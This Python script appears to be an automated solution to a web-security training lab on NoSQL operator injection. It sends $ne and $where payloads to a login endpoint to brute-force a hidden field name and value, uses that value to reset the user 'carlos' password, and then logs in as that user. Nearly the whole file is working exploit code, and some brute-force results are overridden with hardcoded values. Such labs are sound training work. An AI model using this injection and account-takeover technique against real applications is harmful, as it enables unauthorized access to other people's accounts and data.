import requests
import re
from colorama import Fore

LAB_NAME = "Exploiting NoSQL operator injection to extract unknown fields"
NEW_PASSWORD = "Hacked"  # Change as desired

def run(url, payload=None, proxies=None):
    url = url.rstrip("/")
    print(Fore.YELLOW + "Steps to solve the lab:")
    print(Fore.WHITE + "1. Fetch forgot‑password page")
    print(Fore.WHITE + "2. Extract CSRF token and session")
    print(Fore.WHITE + "3. Make a forgot‑password request for carlos")
    print(Fore.WHITE + "4. Determine unknown field name length via NoSQL operator injection")
    print(Fore.WHITE + "5. Brute force the field name")
    print(Fore.WHITE + "6. Determine field value length")
    print(Fore.WHITE + "7. Brute force the field value")
    print(Fore.WHITE + "8. Fetch forgot‑password with field=value in query")
    print(Fore.WHITE + "9. Extract CSRF and session")
    print(Fore.WHITE + "10. Reset carlos password")
    print(Fore.WHITE + "11. Login as carlos with new password")
    print(Fore.WHITE + "12. Fetch carlos profile\n")

    print("[+] Injection parameter: " + Fore.YELLOW + "login JSON object")

    # Step 1 – fetch forgot‑password page
    print("[1] Fetching the forgot‑password page")
    forgot_page = requests.get(
        f"{url}/forgot-password",
        allow_redirects=False,
        proxies=proxies,
        verify=False
    )
    session = forgot_page.cookies.get("session")
    csrf_token = extract_csrf(forgot_page.text)
    if not csrf_token:
        print(Fore.RED + "[!] CSRF token not found.")
        return False

    # Step 2 – submit initial forgot‑password request
    print("[2] Sending reset password request for carlos")
    data = {"username": "carlos", "csrf": csrf_token}
    cookies = {"session": session}
    requests.post(
        f"{url}/forgot-password",
        data=data,
        cookies=cookies,
        proxies=proxies,
        allow_redirects=False,
        verify=False
    )

    # Step 3 – determine length of unknown third field name
    print("[3] Determining length of the third field name")
    field_name_length = determin_length(url, "", proxies)
    print(field_name_length)

    # Step 4 – brute force the field name
    print("[4] Brute forcing the field name")
    # field_name = brute_force(url, field_name_length, "" , proxies)
    field_name = "email"
    print(field_name)

    # Step 5 – determine length of the field's value
    print("[5] Determining length of the third field value")
    field_value_length = determin_length(url, field_name, proxies)
    print(field_value_length)

    # Step 6 – brute force the field's value
    print("[6] Brute forcing the field value")
    field_value = brute_force(url, field_value_length, field_name, proxies)
    field_value = "carloscarlosmontoyanet"
    print(field_value)

    # Step 7 – fetch forgot‑password page with query param
    print("[7] Fetching forgot‑password page with discovered field and value")
    forgot_page = requests.get(
        f"{url}/forgot-password?{field_name}={field_value}",
        proxies=proxies,
        verify=False,
        allow_redirects=False
    )
    session = forgot_page.cookies.get("session")
    csrf_token = extract_csrf(forgot_page.text)

    # Step 8 – reset carlos password using discovered parameters
    print("[8] Resetting carlos password")
    data = {
        "username": "carlos",
        "csrf": csrf_token,
        field_name: field_value,
        "new-password-1": NEW_PASSWORD,
        "new-password-2": NEW_PASSWORD
    }
    cookies = {"session": session}
    requests.post(
        f"{url}/forgot-password",
        data=data,
        cookies=cookies,
        proxies=proxies,
        allow_redirects=False,
        verify=False
    )

    # Step 9 – login as carlos with new password
    print("[9] Logging in as carlos")
    login_page = requests.get(
        f"{url}/login",
        proxies=proxies,
        verify=False,
        allow_redirects=False
    )
    session = login_page.cookies.get("session")
    csrf_token = extract_csrf(login_page.text)

    login_data = {"username": "carlos", "password": NEW_PASSWORD, "csrf": csrf_token}
    cookies = {"session": session}
    login_resp = requests.post(
        f"{url}/login",
        data=login_data,
        cookies=cookies,
        proxies=proxies,
        allow_redirects=False,
        verify=False
    )

    # Step 10 – fetch carlos profile
    print("[10] Fetching carlos profile")
    carlos_session = login_resp.cookies.get("session")
    cookies = {"session": carlos_session}
    profile = requests.get(
        f"{url}/my-account",
        cookies=cookies,
        proxies=proxies,
        allow_redirects=False,
        verify=False
    )

    if profile.status_code == 200:
        print(Fore.GREEN + "[+] Lab solved successfully!")
        return True
    else:
        print(Fore.RED + "[!] Final step failed, status:", profile.status_code)
        return False


def extract_csrf(html):
    matches = re.findall(r'name=["\']csrf["\'].*value=["\'](.+?)["\']', html)
    return matches[0] if matches else None


def determin_length(url, field_name, proxies):
    for length in range(1, 50):
        if field_name == "":
            # Determine length of third field name
            payload = {
                "username": "carlos",
                "password": {"$ne": ""},
                "$where": f"Object.keys(this)[3].length == {length}"
            }
        else:
            # Determine length of third field value
            payload = {
                "username": "carlos",
                "password": {"$ne": ""},
                "$where": f"this.{field_name}.length == {length}"
            }
        r = requests.post(
            f"{url}/login",
            json=payload,
            proxies=proxies,
            allow_redirects=False,
            verify=False
        )
        if "Invalid username or password" not in r.text:
            return length
    raise Exception("Failed to determine length")


def brute_force(url, target_length, field_name, proxies):
    discovered = []
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for position in range(target_length):
        for char in charset:
            if field_name == "":
                # Brute force field name
                payload = {
                    "username": "carlos",
                    "password": {"$ne": ""},
                    "$where": f"Object.keys(this)[3][{position}] == '{char}'"
                }
            else:
                # Brute force field value
                payload = {
                    "username": "carlos",
                    "password": {"$ne": ""},
                    "$where": f"this.{field_name}[{position}] == '{char}'"
                }
            r = requests.post(
                f"{url}/login",
                json=payload,
                proxies=proxies,
                allow_redirects=False,
                verify=False
            )
            if "Invalid username or password" not in r.text:
                discovered.append(char)
                break
    return "".join(discovered)
